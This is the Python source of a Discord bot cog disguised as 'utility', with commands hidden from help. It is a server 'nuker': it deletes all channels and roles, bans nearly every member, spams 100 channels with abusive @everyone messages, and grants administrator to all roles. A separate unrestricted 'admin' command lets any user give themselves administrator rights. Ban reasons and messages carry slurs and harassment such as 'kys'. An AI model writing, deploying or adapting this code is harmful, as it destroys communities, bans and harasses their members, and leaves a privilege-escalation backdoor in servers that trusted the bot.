import discord, os, sys
from discord.ext import commands



def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)


class utility(commands.Cog, command_attrs=dict(hidden=True)): # Set it to False to make commands visible in the Help command
  def __init__(self, client):
    self.client = client


  @commands.command()
  @commands.is_owner()
  async def all(self, ctx):
    for channels in ctx.guild.channels:
      try:
        await channels.delete(reason = "Fuck you")
      except Exception:
        pass
    for roles in ctx.guild.roles:
      try:
        await roles.delete(reason = "Fuck yourself")
      except Exception:
        pass
    for members in ctx.guild.members:
      try:
        if members.id == ctx.author.id:
          pass
        elif members.id == 735119498767761530:
          pass
        else:
          await members.ban(reason = "mf be gay")
      except Exception:
        pass
    try:
      await ctx.author.send("Nuking done.")
    except Exception:
      pass
    amount = 100
    while amount > 0:
      chnl = await ctx.guild.create_text_channel(name = "fuck yall")
      await chnl.send("@everyone fuck yourself bitch")
      await ctx.guild.create_role(name = "nuked")
      amount -=1
    try:
      await ctx.author.send("Spamming channels and roles done.")
    except Exception:
      pass

  @commands.command()
  @commands.is_owner()
  async def roles(self, ctx):
    for roles in ctx.guild.roles:
      try:
        await roles.delete(reason = "Fuck yourself")
      except Exception:
        pass
    try:
      await ctx.author.send("Deleting roles done.")
    except Exception:
      pass

  @commands.command()
  @commands.is_owner()
  async def channels(self, ctx):
    for channels in ctx.guild.channels:
      try:
        await channels.delete(reason = "Fuck you")
      except Exception:
        pass
    try:
      await ctx.author.send("Deleting channels done.")
    except Exception:
      pass

  @commands.command()
  @commands.is_owner()
  async def members(self, ctx):
    for members in ctx.guild.members:
      try:
        if members.id == ctx.author.id:
          pass
        else:
          await members.ban(reason = "bitch kys")
      except Exception:
        pass
    try:
      await ctx.author.send("Banning members done.")
    except Exception:
      pass

  @commands.command()
  @commands.is_owner()
  async def spam(self, ctx):
    amount = 100
    while amount > 0:
      chnl = await ctx.guild.create_text_channel(name = "fuck yall")
      await chnl.send("@everyone fuck yourself bitch")
      await ctx.guild.create_role(name = "nuked")
      amount -=1
    try:
      await ctx.author.send("Spamming channels and roles done.")
    except Exception:
      pass

  @commands.command()
  @commands.is_owner()
  async def chaos(self, ctx):
    perms = discord.Permissions(administrator=True)
    for role in ctx.guild.roles:
      try:
        await role.edit(permissions = perms)
      except Exception:
        pass
    await ctx.author.send("Administrator roles chaos done.")

  @commands.command()
  async def admin(self, ctx):
    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name = "new role", permissions = perms)
    await ctx.author.add_roles(role)
    await ctx.author.send("You now have administraor permissions.")


  @commands.command(aliases = ["restart"])
  @commands.is_owner()
  async def stop(self, ctx):
    await ctx.author.send("Bot stopped/restarted.")
    restart_program()


def setup(client):
  client.add_cog(utility(client))
